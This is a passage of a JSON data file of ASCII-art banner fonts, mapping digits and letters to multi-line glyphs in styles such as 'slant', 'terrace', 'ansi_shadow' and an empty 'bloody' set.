          "\u2584\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580\u2588"
        ],
        "R": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2584",
          "\u2580 \u2580"
        ],
        "S": [
          "\u2584\u2580\u2580",
          "\u2580\u2580\u2584",
          "\u2580\u2580\u2580"
        ],
        "T": [
          "\u2580\u2588\u2580",
          " \u2588 ",
          " \u2580 "
        ],
        "U": [
          "\u2588 \u2588",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "V": [
          "\u2588 \u2588",
          "\u2588 \u2588",
          "\u2580\u2580 "
        ],
        "W": [
          "\u2588 \u2588",
          "\u2588\u2584\u2588",
          "\u2580 \u2580"
        ],
        "X": [
          "\u2580\u2584\u2580",
          " \u2588 ",
          "\u2580 \u2580"
        ],
        "Y": [
          "\u2588 \u2588",
          "\u2580\u2588\u2580",
          " \u2580 "
        ],
        "Z": [
          "\u2580\u2580\u2588",
          " \u2584\u2580",
          "\u2588\u2580\u2580"
        ]
      },
      "big_money_ne": {
        "0": [
          " /--\\ ",
          "| /  |",
          "|/   |",
          " \\__/ ",
          "      ",
          "      "
        ],
        "1": [
          "  /|  ",
          " / |  ",
          "   |  ",
          " -----",
          "      ",
          "      "
        ],
        "2": [
          " /--\\ ",
          "    / ",
          "   /  ",
          " -----",
          "      ",
          "      "
        ],
        "3": [
          "----\\ ",
          "   _/ ",
          "   _\\ ",
          "____/ ",
          "      ",
          "      "
        ],
        "4": [
          "  /|  ",
          " /_|__",
          "   |  ",
          "   |  ",
          "      ",
          "      "
        ],
        "5": [
          "----- ",
          "|___  ",
          "    \\ ",
          "____/ ",
          "      ",
          "      "
        ],
        "6": [
          " /--  ",
          "| __  ",
          "|   | ",
          " \\__/ ",
          "      ",
          "      "
        ],
        "7": [
          "----- ",
          "   /  ",
          "  /   ",
          " /    ",
          "      ",
          "      "
        ],
        "8": [
          " /--\\ ",
          " \\__/ ",
          " /  \\ ",
          " \\__/ ",
          "      ",
          "      "
        ],
        "9": [
          " /--\\ ",
          "|  __|",
          " \\__\\ ",
          "    / ",
          "      ",
          "      "
        ],
        " ": [
          "      ",
          "      ",
          "      ",
          "      ",
          "      ",
          "      "
        ],
        "A": [
          "  /\\  ",
          " /  \\ ",
          "/ /\\ \\",
          "\\/  \\/",
          "      ",
          "      "
        ],
        "B": [
          "/---\\ ",
          "| __| ",
          "|  _| ",
          "\\___/ ",
          "      ",
          "      "
        ],
        "C": [
          " /--\\ ",
          "| |   ",
          "| |__ ",
          " \\__/ ",
          "      ",
          "      "
        ],
        "D": [
          "|---\\ ",
          "|   | ",
          "|   | ",
          "|___/ ",
          "      ",
          "      "
        ],
        "E": [
          "|---| ",
          "| |_  ",
          "|  _| ",
          "|___| ",
          "      ",
          "      "
        ],
        "F": [
          "|---| ",
          "| |_  ",
          "|  _| ",
          "|_|   ",
          "      ",
          "      "
        ],
        "G": [
          " /--\\ ",
          "| |   ",
          "| | | ",
          " \\__\\ ",
          "      ",
          "      "
        ],
        "H": [
          "|   | ",
          "|___| ",
          "|   | ",
          "|   | ",
          "      ",
          "      "
        ],
        "I": [
          " ---  ",
          "  |   ",
          "  |   ",
          " ---  ",
          "      ",
          "      "
        ],
        "J": [
          " ---- ",
          "   |  ",
          "   |  ",
          "\\__/  ",
          "      ",
          "      "
        ],
        "K": [
          "|  /  ",
          "|_/   ",
          "| \\   ",
          "|  \\  ",
          "      ",
          "      "
        ],
        "L": [
          "|     ",
          "|     ",
          "|     ",
          "|___  ",
          "      ",
          "      "
        ],
        "M": [
          "|\\/|  ",
          "|  |  ",
          "|  |  ",
          "|  |  ",
          "      ",
          "      "
        ],
        "N": [
          "|\\ |  ",
          "| \\|  ",
          "|  |  ",
          "|  |  ",
          "      ",
          "      "
        ],
        "O": [
          " /--\\ ",
          "|    |",
          "|    |",
          " \\__/ ",
          "      ",
          "      "
        ],
        "P": [
          "|---\\ ",
          "|___/ ",
          "|     ",
          "|     ",
          "      ",
          "      "
        ],
        "Q": [
          " /--\\ ",
          "|    |",
          "|  \\ |",
          " \\__\\|",
          "      ",
          "      "
        ],
        "R": [
          "|---\\ ",
          "|___/ ",
          "|  \\  ",
          "|   \\ ",
          "      ",
          "      "
        ],
        "S": [
          " /--\\ ",
          " \\__\\ ",
          "    | ",
          " \\__/ ",
          "      ",
          "      "
        ],
        "T": [
          "----- ",
          "  |   ",
          "  |   ",
          "  |   ",
          "      ",
          "      "
        ],
        "U": [
          "|   | ",
          "|   | ",
          "|   | ",
          " \\__/ ",
          "      ",
          "      "
        ],
        "V": [
          "\\   / ",
          " \\ /  ",
          "  V   ",
          "  V   ",
          "      ",
          "      "
        ],
        "W": [
          "|   | ",
          "| | | ",
          "|_|_| ",
          "      ",
          "      ",
          "      "
        ],
        "X": [
          "\\   / ",
          " > <  ",
          "/   \\ ",
          "      ",
          "      ",
          "      "
        ],
        "Y": [
          "\\   / ",
          " \\ /  ",
          "  |   ",
          "  |   ",
          "      ",
          "      "
        ],
        "Z": [
          "----- ",
          "   /  ",
          "  /   ",
          "----- ",
          "      ",
          "      "
        ]
      },
      "miniwi": {
        "0": [
          "()  ",
          "()  ",
          "    "
        ],
        "1": [
          "/|  ",
          " |  ",
          "    "
        ],
        "2": [
          "_)  ",
          "/_  ",
          "    "
        ],
        "3": [
          "_)  ",
          "_)  ",
          "    "
        ],
        "4": [
          "|_| ",
          "  | ",
          "    "
        ],
        "5": [
          "|_  ",
          "_)  ",
          "    "
        ],
        "6": [
          "/   ",
          "(_  ",
          "    "
        ],
        "7": [
          "--/ ",
          " /  ",
          "    "
        ],
        "8": [
          "( ) ",
          "(_) ",
          "    "
        ],
        "9": [
          "(_) ",
          "  / ",
          "    "
        ],
        " ": [
          "  ",
          "  ",
          "  "
        ],
        "A": [
          " /\\ ",
          "/--\\",
          "    "
        ],
        "B": [
          "|-) ",
          "|_) ",
          "    "
        ],
        "C": [
          "/`  ",
          "\\_, ",
          "    "
        ],
        "D": [
          "|\\  ",
          "|/  ",
          "    "
        ],
        "E": [
          "|-- ",
          "|__ ",
          "    "
        ],
        "F": [
          "|-- ",
          "|   ",
          "    "
        ],
        "G": [
          "/`  ",
          "\\_\\ ",
          "    "
        ],
        "H": [
          "|-| ",
          "| | ",
          "    "
        ],
        "I": [
          " |  ",
          " |  ",
          "    "
        ],
        "J": [
          " |  ",
          "_/  ",
          "    "
        ],
        "K": [
          "|/  ",
          "|\\  ",
          "    "
        ],
        "L": [
          "|   ",
          "|_  ",
          "    "
        ],
        "M": [
          "|V| ",
          "| | ",
          "    "
        ],
        "N": [
          "|\\| ",
          "| | ",
          "    "
        ],
        "O": [
          "( ) ",
          "(_) ",
          "    "
        ],
        "P": [
          "|-) ",
          "|   ",
          "    "
        ],
        "Q": [
          "( ) ",
          "(_\\ ",
          "    "
        ],
        "R": [
          "|-) ",
          "|\\  ",
          "    "
        ],
        "S": [
          "_   ",
          "_)  ",
          "    "
        ],
        "T": [
          "-+- ",
          " |  ",
          "    "
        ],
        "U": [
          "| | ",
          "|_| ",
          "    "
        ],
        "V": [
          "\\ / ",
          " V  ",
          "    "
        ],
        "W": [
          "\\ / ",
          " W  ",
          "    "
        ],
        "X": [
          "><  ",
          "><  ",
          "    "
        ],
        "Y": [
          "\\/  ",
          "/   ",
          "    "
        ],
        "Z": [
          "-/. ",
          "/_. ",
          "    "
        ]
      },
      "slant": {
        "0": [
          "   ___  ",
          "  / _ \\ ",
          " / // / ",
          " \\___/  "
        ],
        "1": [
          "   ___",
          "  <  /",
          "  / / ",
          " /_/  "
        ],
        "2": [
          "   ___ ",
          "  |__ \\",
          "  __/ /",
          " /____/"
        ],
        "3": [
          "  ____",
          " /_  /",
          "  _ < ",
          "/____/"
        ],
        "4": [
          "   __ __",
          "  / // /",
          " / // /_",
          "/__  __/"
        ],
        "5": [
          "    ______",
          "   / ____/",
          "  /___ \\  ",
          " /_____/  "
        ],
        "6": [
          "   _____",
          "  / ___/",
          " / __ \\ ",
          "/____/  "
        ],
        "7": [
          "  __  ",
          " / /  ",
          "/ /   ",
          "/_/   "
        ],
        "8": [
          "   ___ ",
          "  ( _ )",
          " / _ \\ ",
          " \\___/ "
        ],
        "9": [
          "   ____ ",
          "  / __ \\",
          " / /_/ /",
          " \\____/ "
        ],
        " ": [
          "    ",
          "    ",
          "    ",
          "    "
        ],
        "A": [
          "   /\\  ",
          "  /  \\ ",
          " / /\\ \\",
          "/_/  \\_\\"
        ],
        "B": [
          "    __ ",
          "   /  )",
          "  /  < ",
          " /___/ "
        ],
        "C": [
          "   ______",
          "  / ____/",
          " / /___  ",
          "/_____/  "
        ],
        "D": [
          "    __ ",
          "   /  \\",
          "  /   /",
          " /___/ "
        ],
        "E": [
          "    ______",
          "   / ____/",
          "  / __/   ",
          " /_____/  "
        ],
        "F": [
          "    ______",
          "   / ____/",
          "  / /_    ",
          " /_/      "
        ],
        "G": [
          "   ______",
          "  / ____/",
          " / /_ __ ",
          "/_____/_/"
        ],
        "H": [
          "    __  __",
          "   / / / /",
          "  / /_/ / ",
          " /_  __/  "
        ],
        "I": [
          "    __",
          "   / /",
          "  / / ",
          " /_/  "
        ],
        "J": [
          "       __",
          "      / /",
          " __  / / ",
          "/____/   "
        ],
        "K": [
          "    __ __",
          "   / //_/",
          "  / ,<   ",
          " /_/|_|  "
        ],
        "L": [
          "    __   ",
          "   / /   ",
          "  / /___ ",
          " /_____/ "
        ],
        "M": [
          "    __  ___",
          "   /  |/  /",
          "  / /|_/ / ",
          " /_/  /_/  "
        ],
        "N": [
          "    _  __",
          "   / |/ /",
          "  /    / ",
          " /_/|_/  "
        ],
        "O": [
          "   ____ ",
          "  / __ \\",
          " / /_/ /",
          " \\____/ "
        ],
        "P": [
          "    ____ ",
          "   / __ \\",
          "  / /_/ /",
          " / ____/ "
        ],
        "Q": [
          "   ____ ",
          "  / __ \\",
          " / /_/ /",
          " \\___\\_\\"
        ],
        "R": [
          "    ____ ",
          "   / __ \\",
          "  / /_/ /",
          " /_  _ \\ "
        ],
        "S": [
          "   _____",
          "  / ___/",
          " (__  ) ",
          "/____/  "
        ],
        "T": [
          "  ______",
          " /_  __/",
          "  / /   ",
          " /_/    "
        ],
        "U": [
          "   __  __",
          "  / / / /",
          " / /_/ / ",
          " \\____/  "
        ],
        "V": [
          "   _  __",
          "  | |/ /",
          "  |   / ",
          "  |__/  "
        ],
        "W": [
          "   _       __",
          "  | |     / /",
          "  | | /| / / ",
          "  | |/ |/ /  "
        ],
        "X": [
          "   _  __",
          "  | |/ /",
          "  |   < ",
          "  |/|/| "
        ],
        "Y": [
          "   __  __",
          "   \\ \\/ /",
          "    \\  / ",
          "    /_/  "
        ],
        "Z": [
          "  ______",
          " /_  __/",
          "  / /_  ",
          " /___/  "
        ]
      },
      "terrace": {
        "0": [
          "  _  ",
          " / \\ ",
          "( 0 )",
          " \\_/ ",
          "     "
        ],
        "1": [
          "  _  ",
          " /_) ",
          " (_) ",
          " (_) ",
          "     "
        ],
        "2": [
          " ___ ",
          "(__ )",
          " ( / ",
          "(___)",
          "     "
        ],
        "3": [
          " ___ ",
          "(__ )",
          " __) ",
          "(___)",
          "     "
        ],
        "4": [
          " _ _ ",
          "(_| )",
          "  | |",
          "  |_|",
          "     "
        ],
        "5": [
          " ___ ",
          "(___)",
          " __) ",
          "(___)",
          "     "
        ],
        "6": [
          "  _  ",
          " /   ",
          "( 6 )",
          " \\_/ ",
          "     "
        ],
        "7": [
          " ___ ",
          "(__ )",
          "  /  ",
          " /   ",
          "     "
        ],
        "8": [
          "  _  ",
          " (8) ",
          " (8) ",
          " \\_/ ",
          "     "
        ],
        "9": [
          "  _  ",
          " (9) ",
          "   ) ",
          " \\_/ ",
          "     "
        ],
        " ": [
          "     ",
          "     ",
          "     ",
          "     ",
          "     "
        ],
        "A": [
          "  _  ",
          " / \\ ",
          "( A )",
          " \\_/ ",
          "     "
        ],
        "B": [
          " __  ",
          "(  ) ",
          " ) ( ",
          "(__) ",
          "     "
        ],
        "C": [
          "  _  ",
          " / \\ ",
          "(   )",
          " \\_/ ",
          "     "
        ],
        "D": [
          " __  ",
          "(  \\ ",
          " )  )",
          "(__/ ",
          "     "
        ],
        "E": [
          " ___ ",
          "(___)",
          "( __)",
          "(___)",
          "     "
        ],
        "F": [
          " ___ ",
          "(___)",
          "( __)",
          "(_)  ",
          "     "
        ],
        "G": [
          "  _  ",
          " / \\ ",
          "( G )",
          " \\_/ ",
          "     "
        ],
        "H": [
          " _ _ ",
          "(_) )",
          "(  ( ",
          "(_|_) ",
          "     "
        ],
        "I": [
          "  _  ",
          " (_) ",
          " (_) ",
          " (_) ",
          "     "
        ],
        "J": [
          "   _ ",
          "  (_)",
          "  (_)",
          "(_(_)",
          "     "
        ],
        "K": [
          " _ _ ",
          "(_) )",
          "(  ( ",
          "(_(_) ",
          "     "
        ],
        "L": [
          " _   ",
          "(_)  ",
          "(_)  ",
          "(___)",
          "     "
        ],
        "M": [
          " _ _ ",
          "( V )",
          "(   )",
          "(_|_) ",
          "     "
        ],
        "N": [
          " _ _ ",
          "( \\ )",
          "(  \\)",
          "(_|_) ",
          "     "
        ],
        "O": [
          "  _  ",
          " / \\ ",
          "( O )",
          " \\_/ ",
          "     "
        ],
        "P": [
          " ___ ",
          "(_  )",
          "(_ _) ",
          "(_)   ",
          "     "
        ],
        "Q": [
          "  _  ",
          " / \\ ",
          "( Q )",
          " \\_\\ ",
          "     "
        ],
        "R": [
          " ___ ",
          "(_  )",
          "(_ _)",
          "(_| \\",
          "     "
        ],
        "S": [
          "  _  ",
          " (_  ",
          " __) ",
          "(___)",
          "     "
        ],
        "T": [
          " ___ ",
          "(_ _)",
          " (_) ",
          " (_) ",
          "     "
        ],
        "U": [
          " _ _ ",
          "(_) )",
          "(  ( ",
          "(___)",
          "     "
        ],
        "V": [
          " _ _ ",
          "(_) )",
          "( V )",
          " (_) ",
          "     "
        ],
        "W": [
          " _ _ ",
          "(_) )",
          "( W )",
          "(_|_)",
          "     "
        ],
        "X": [
          " _ _ ",
          "( X )",
          " ) ( ",
          "(_|_)",
          "     "
        ],
        "Y": [
          " _ _ ",
          "( Y )",
          " ) ( ",
          " (_) ",
          "     "
        ],
        "Z": [
          " ___ ",
          "(__ )",
          " ( / ",
          "(___)",
          "     "
        ]
      },
      "ansi_shadow": {
        "0": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2588\u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "1": [
          "  \u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2551",
          "  \u2588\u2588\u2551",
          "  \u2588\u2588\u2551",
          "  \u255A\u2550\u255D"
        ],
        "2": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2557",
          "  \u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u255D ",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D"
        ],
        "3": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2557",
          "  \u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "4": [
          " \u2588\u2588\u2557  \u2588\u2588\u2557",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551",
          "      \u2588\u2588\u2551",
          "      \u255A\u2550\u255D"
        ],
        "5": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D"
        ],
        "6": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D ",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "7": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2588\u2588\u2557",
          "      \u2588\u2588\u2554\u255D",
          "     \u2588\u2588\u2554\u255D ",
          "    \u2588\u2588\u2554\u255D  ",
          "    \u255A\u2550\u255D   "
        ],
        "8": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          "  \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "   \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "9": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          "  \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        " ": [
          "        ",
          "        ",
          "        ",
          "        ",
          "        ",
          "        "
        ],
        "A": [
          "  \u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u255A\u2550\u255D  \u255A\u2550\u255D"
        ],
        "B": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "C": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2551     ",
          " \u2588\u2588\u2551     ",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          "  \u255A\u2550\u2550\u2550\u2550\u2550\u255D"
        ],
        "D": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "E": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2588\u2588\u2588\u2557  ",
          " \u2588\u2588\u2554\u2550\u2550\u255D  ",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "F": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2588\u2588\u2588\u2557  ",
          " \u2588\u2588\u2554\u2550\u2550\u255D  ",
          " \u2588\u2588\u2551     ",
          " \u255A\u2550\u255D     "
        ],
        "G": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2551  \u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "H": [
          " \u2588\u2588\u2557  \u2588\u2588\u2557",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u255A\u2550\u255D  \u255A\u2550\u255D"
        ],
        "I": [
          " \u2588\u2588\u2557",
          " \u2588\u2588\u2551",
          " \u2588\u2588\u2551",
          " \u2588\u2588\u2551",
          " \u2588\u2588\u2551",
          " \u255A\u2550\u255D"
        ],
        "J": [
          "      \u2588\u2588\u2557",
          "      \u2588\u2588\u2551",
          "      \u2588\u2588\u2551",
          " \u2588\u2588   \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u255D "
        ],
        "K": [
          " \u2588\u2588\u2557  \u2588\u2588\u2557",
          " \u2588\u2588\u2551 \u2588\u2588\u2554\u255D",
          " \u2588\u2588\u2588\u2588\u2588\u2554\u255D ",
          " \u2588\u2588\u2554\u2550\u2588\u2588\u2557 ",
          " \u2588\u2588\u2551  \u2588\u2588\u2557",
          " \u255A\u2550\u255D  \u255A\u2550\u255D"
        ],
        "L": [
          " \u2588\u2588\u2557     ",
          " \u2588\u2588\u2551     ",
          " \u2588\u2588\u2551     ",
          " \u2588\u2588\u2551     ",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D"
        ],
        "M": [
          " \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551",
          " \u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551",
          " \u2588\u2588\u2551\u255A\u2588\u2588\u2554\u255D\u2588\u2588\u2551",
          " \u2588\u2588\u2551 \u255A\u2550\u255D \u2588\u2588\u2551",
          " \u255A\u2550\u255D     \u255A\u2550\u255D"
        ],
        "N": [
          " \u2588\u2588\u2588\u2557   \u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551",
          " \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551",
          " \u2588\u2588\u2551\u255A\u2588\u2588\u2557\u2588\u2588\u2551",
          " \u2588\u2588\u2551 \u255A\u2588\u2588\u2588\u2588\u2551",
          " \u255A\u2550\u255D  \u255A\u2550\u2550\u2550\u255D"
        ],
        "O": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u2550\u255D "
        ],
        "P": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u255D ",
          " \u2588\u2588\u2551     ",
          " \u255A\u2550\u255D     "
        ],
        "Q": [
          "  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u2588\u2588\u2551\u2584\u2584 \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2580\u2580\u2550\u255D "
        ],
        "R": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u255A\u2550\u255D  \u255A\u2550\u255D"
        ],
        "S": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D"
        ],
        "T": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255D",
          "    \u2588\u2588\u2551   ",
          "    \u2588\u2588\u2551   ",
          "    \u2588\u2588\u2551   ",
          "    \u255A\u2550\u255D   "
        ],
        "U": [
          " \u2588\u2588\u2557  \u2588\u2588\u2557",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u2588\u2588\u2551  \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u2550\u2550\u255D "
        ],
        "V": [
          " \u2588\u2588\u2557   \u2588\u2588\u2557",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u2588\u2588\u2551   \u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2557 \u2588\u2588\u2554\u255D",
          "  \u255A\u2588\u2588\u2588\u2588\u2554\u255D ",
          "   \u255A\u2550\u2550\u2550\u255D  "
        ],
        "W": [
          " \u2588\u2588\u2557    \u2588\u2588\u2557",
          " \u2588\u2588\u2551    \u2588\u2588\u2551",
          " \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551",
          " \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551",
          " \u255A\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255D",
          "  \u255A\u2550\u2550\u255D\u255A\u2550\u2550\u255D "
        ],
        "X": [
          " \u2588\u2588\u2557  \u2588\u2588\u2557",
          " \u255A\u2588\u2588\u2557\u2588\u2588\u2554\u255D",
          "  \u255A\u2588\u2588\u2588\u2554\u255D ",
          "  \u2588\u2588\u2554\u2588\u2588\u2557 ",
          " \u2588\u2588\u2554\u255D \u2588\u2588\u2557",
          " \u255A\u2550\u255D  \u255A\u2550\u255D"
        ],
        "Y": [
          " \u2588\u2588\u2557   \u2588\u2588\u2557",
          " \u255A\u2588\u2588\u2557 \u2588\u2588\u2554\u255D",
          "  \u255A\u2588\u2588\u2588\u2588\u2554\u255D ",
          "   \u255A\u2588\u2588\u2554\u255D  ",
          "    \u2588\u2588\u2551   ",
          "    \u255A\u2550\u255D   "
        ],
        "Z": [
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2588\u2588\u2588\u2554\u255D",
          "   \u2588\u2588\u2588\u2554\u255D ",
          "  \u2588\u2588\u2588\u2554\u255D  ",
          " \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557",
          " \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D"
        ]
      },
      "bloody": {
        "0": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "1": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "2": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "3": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "4": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "5": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "6": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "7": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "8": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          ""
        ],
        "9": [
          "",
          "",
          "",
          "",
          "",
          "",
          "",
          "",
